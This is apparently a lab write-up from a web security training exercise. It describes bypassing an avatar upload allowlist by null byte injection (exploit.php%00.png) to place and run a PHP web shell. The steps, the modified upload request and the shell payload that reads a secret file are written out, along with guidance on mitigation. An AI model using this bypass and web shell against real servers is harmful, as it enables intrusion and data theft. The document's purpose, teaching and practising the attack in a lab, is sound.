Lab 5 — Web Shell Upload via Obfuscated File Extension

🟣 Critical 📅 2026-08-03

📋 Finding Summary

FieldValue
TypeWeb App
Severity🟣 Critical
CVE / CWECWE-434, CWE-20
Date2026-08-03

🔍 Description

The avatar upload functionality validates uploaded filenames against an allowlist permitting only JPG and PNG extensions. However, the validation routine is vulnerable to null byte injection. By inserting a URL-encoded null byte (%00) between the true extension and a permitted extension in the Content-Disposition filename parameter (e.g., exploit.php%00.png), an attacker can pass the allowlist check while causing the underlying C-string file system handler to truncate the filename at the null byte and save the file as exploit.php. Requesting the uploaded shell causes Apache to execute it, returning the output of arbitrary server-side PHP code.

🎯 End Goals

  • Bypass the file extension allowlist by injecting a null byte into the filename parameter.
  • Upload a PHP web shell that the server saves as exploit.php despite the allowlist.
  • Execute the web shell to read /home/carlos/secret and submit it to solve the lab.

🪜 Steps to Reproduce

  1. Log in as wiener and navigate to the My Account page.
  2. Upload a benign PNG image to confirm the upload mechanism and identify the file-serving path.
  3. Inspect Burp traffic to locate the upload endpoint and the URL from which uploaded avatars are served.
  4. Attempt to upload a PHP web shell directly to confirm it is blocked by the allowlist.
  5. In Burp Repeater, modify the upload request to inject a null byte into the filename, appending a permitted extension after it.
  6. Issue a GET request to the uploaded shell’s URL to trigger PHP execution and retrieve the secret.
  7. Submit the secret to solve the lab.

🧠 Analysis

Step 1 — Lab setup — logging in and locating the avatar upload form

Navigated to the lab and logged in with the provided credentials (wiener). The My Account page at /my-account presents an avatar upload form that posts files to /my-account/avatar as a multipart request.

Step 2 — Upload a benign image to map the upload directory

Selected image.png and clicked Upload. The server responded with “The file avatars/image.png has been uploaded,” confirming files land in an avatars/ subdirectory. The My Account page then rendered the uploaded image as the current avatar. During this step, an initial attempt with image.jpeg was rejected — “Sorry, only JPG & PNG files are allowed” — indicating the filter performs a strict extension check rather than a flexible MIME-type comparison. Switching to image.png was accepted.

Step 3 — Inspect Burp to confirm the upload endpoint and file-serving path

In Burp Proxy HTTP history, the POST to /my-account/avatar confirmed filename="image.png" and Content-Type: image/png, with HTTP 200. The Server header revealed Apache/2.4.41 (Ubuntu). Inspecting the GET /my-account response body showed <img src="/files/avatars/image.png" class="avatar">, confirming uploaded avatars are served from the /files/avatars/ URL path.

Step 4 — Attempt direct PHP web shell upload — blocked by the allowlist

Selected exploit.php containing <?php echo file_get_contents('/home/carlos/secret'); ?> and submitted the upload form. In Burp, the POST to /my-account/avatar showed filename="exploit.php" and Content-Type: application/x-php. The server responded with HTTP 403: “Sorry, only JPG & PNG files are allowed.” The .php extension is not on the allowlist and is rejected outright.

Step 5 — Null byte injection bypasses the allowlist

In Burp Repeater, modified the upload request to set filename="exploit.php%00.png" with Content-Type: application/x-php and body <?php echo file_get_contents('/home/carlos/secret'); ?>. The server’s validation routine reads the full filename string and finds .png — a permitted extension. However, the underlying C-string file system handler truncates the filename at the null byte (\x00), saving the file as exploit.php in the avatars/ directory. The server responded with HTTP 200: "The file avatars/exploit.php has been uploaded."

Step 6 — Execute the web shell and retrieve the secret

In a second Repeater tab, issued a GET request to /files/avatars/exploit.php. Apache served the file and the PHP engine executed it. The response returned HTTP 200 with Content-Length: 32 and the contents of /home/carlos/secret: mut4UQQvo0SkX0587LMA5qryLKMz4DaG

Step 7 — Submit the secret and solve the lab

Submitted mut4UQQvo0SkX0587LMA5qryLKMz4DaG via the lab’s Submit solution button. The lab confirmed the value was correct and displayed "Congratulations, you solved the lab!"

🎯 Impact

An attacker with upload access can bypass a filename-based allowlist by injecting a null byte into the Content-Disposition filename parameter. This causes the server’s validation layer and its underlying file system layer to interpret the filename differently — the validator sees a safe permitted extension, while the runtime saves the file under its true executable name. The result is unrestricted PHP execution under the web server’s process context, enabling arbitrary file read (demonstrated here with /home/carlos/secret), traversal of the file system, and — depending on server configuration — full remote code execution. The attack is low-complexity, requires only authenticated upload access, and cannot be mitigated by extension-based allowlists alone unless the application also sanitizes null bytes and other special characters from filenames before processing them.
